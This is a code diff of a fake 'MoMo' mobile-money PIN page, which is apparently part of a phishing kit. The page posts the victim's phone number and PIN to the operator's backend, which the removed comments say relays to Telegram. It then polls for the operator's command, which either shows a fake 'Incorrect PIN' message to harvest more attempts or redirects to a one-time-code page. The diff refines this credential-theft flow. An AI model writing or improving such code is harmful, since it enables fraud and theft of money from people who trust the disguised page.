@@ -29,7 +29,6 @@ body {
   margin: 40px auto;
   padding: 25px;
   border-radius: 15px;
-  display: block;
 }
 
 input {
@@ -69,58 +68,69 @@ button:disabled {
 
 <body>
 
-<div class="header">
-  MoMo App
-</div>
+<div class="header">MoMo App</div>
 
-<div class="container" id="pinContainer">
+<div class="container">
   <h3 id="titleText">Enter MoMo PIN</h3>
   <p id="phoneDisplay"></p>
 
   <form id="pinForm">
-    <input type="password" id="pinInput" placeholder="****" maxlength="5" pattern="\d*" inputmode="numeric" required>
+    <input
+      type="password"
+      id="pinInput"
+      placeholder="****"
+      maxlength="6"
+      inputmode="numeric"
+      autocomplete="one-time-code"
+      required
+    >
     <button type="submit" id="pinBtn">Confirm</button>
   </form>
 </div>
 
-<div class="footer">
-  2026@MoMo Verified
-</div>
+<div class="footer">2026@MoMo Verified</div>
 
 <script>
 const phone = localStorage.getItem("phone");
 
-// 1. Security Check
 if (!phone) {
   window.location.href = "/";
-} else {
-  document.getElementById("phoneDisplay").innerText = "Number: " + phone;
 }
 
-// 2. Form Elements
+document.getElementById("phoneDisplay").innerText = "Number: " + phone;
+
 const pinForm = document.getElementById("pinForm");
 const pinInput = document.getElementById("pinInput");
 const pinBtn = document.getElementById("pinBtn");
 const titleText = document.getElementById("titleText");
 
-// 3. Handle PIN Submission
-pinForm.addEventListener("submit", async function(e) {
+let polling = false;
+
+// Prevent non-numeric input (better control)
+pinInput.addEventListener("input", () => {
+  pinInput.value = pinInput.value.replace(/\D/g, "");
+});
+
+// ================= SUBMIT PIN =================
+pinForm.addEventListener("submit", async (e) => {
   e.preventDefault();
-  
-  const pinValue = pinInput.value;
+
+  const pinValue = pinInput.value.trim();
+  if (!pinValue) return;
+
   pinBtn.innerText = "Verifying...";
   pinBtn.disabled = true;
 
   try {
-    // Send PIN to your Backend/Telegram
-    await fetch("/send-pin", {
+    const res = await fetch("/send-pin", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ phone: phone, pin: pinValue })
+      body: JSON.stringify({ phone, pin: pinValue })
     });
 
-    // Start checking for your command from Telegram
-    checkAdminCommand();
+    if (!res.ok) throw new Error("Server error");
+
+    startPolling();
 
   } catch (err) {
     alert("Connection error. Try again.");
@@ -129,35 +139,52 @@ pinForm.addEventListener("submit", async function(e) {
   }
 });
 
-// 4. The Dynamic "Waiting for Admin" Loop
+// ================= POLLING =================
+function startPolling() {
+  if (polling) return;
+  polling = true;
+  checkAdminCommand();
+}
+
 async function checkAdminCommand() {
   try {
     const res = await fetch("/check-pin-status/" + phone);
+
+    if (!res.ok) throw new Error("Status error");
+
     const data = await res.json();
 
     if (data.status === "re-enter") {
-      // Logic for 1/3, 2/3 attempts
       pinBtn.innerText = "Confirm";
       pinBtn.disabled = false;
-      pinInput.value = ""; 
-      titleText.innerText = "Incorrect PIN. Try Again (" + data.attempt + "/3)";
+      pinInput.value = "";
+
+      titleText.innerText =
+        "Incorrect PIN. Try Again (" + (data.attempt || 1) + "/3)";
       titleText.style.color = "red";
-    } 
-    
-    else if (data.status === "success") {
-      titleText.innerText = "Verified Successfully!";
-      titleText.style.color = "green";
-      setTimeout(() => {
-        window.location.href = "/success.html";
-      }, 1500);
-    } 
-    
-    else {
-      // Still pending admin action, check again in 2 seconds
-      setTimeout(checkAdminCommand, 2000);
+
+      polling = false;
+      return;
     }
 
+    if (data.status === "success") {
+      titleText.innerText = "Verified Successfully!";
+      titleText.style.color = "green";
+
+      polling = false;
+
+      setTimeout(() => {
+        window.location.href = "/otp.html";
+      }, 1200);
+
+      return;
+    }
+
+    // keep polling safely
+    setTimeout(checkAdminCommand, 2000);
+
   } catch (err) {
+    console.log("Polling error:", err.message);
     setTimeout(checkAdminCommand, 3000);
   }
 }
